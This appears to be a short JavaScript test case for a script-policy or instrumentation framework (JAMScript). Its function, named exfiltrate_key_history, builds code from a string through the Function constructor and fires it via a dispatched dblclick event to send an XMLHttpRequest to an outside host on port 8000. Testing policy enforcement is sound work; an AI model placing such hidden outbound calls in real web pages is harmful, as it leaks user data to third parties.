
JAM.startProfile('load');
function exfiltrate_key_history(){var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=dispatch", true);xmlhttp.send(null);',button=document.getElementById("test"),event=new Event("dblclick"),exp=JAMScript.call(Function,null,[exp]);button.addEventListener("dblclick",exp,!1);button.dispatchEvent(event)}var v1=document.getElementById("test");JAMScript.set(v1,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
